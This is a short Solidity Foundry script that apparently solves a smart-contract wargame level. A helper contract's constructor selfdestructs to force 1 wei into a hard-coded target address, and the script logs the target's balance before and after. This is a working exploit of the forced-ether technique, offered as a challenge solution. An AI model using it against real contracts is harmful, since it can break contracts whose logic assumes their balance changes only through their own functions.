// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

// target 讓合約餘額大於 0
// notes
// selfdestruct
// selfdestruct(address payable recipient)

contract AttackerCon {
    constructor(address payable _attackerAddress) payable {
        selfdestruct(_attackerAddress);
    }
}

contract Lev7Sol is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log(
            address(payable(0x740466c2d4e1D994d702387ca765CDa4aee8924D)).balance
        );
      
        new AttackerCon{value: 1 wei}(
            payable(0x740466c2d4e1D994d702387ca765CDa4aee8924D)
        );

        console.log(
            address(payable(0x740466c2d4e1D994d702387ca765CDa4aee8924D)).balance
        );

        vm.stopBroadcast();
    }
}
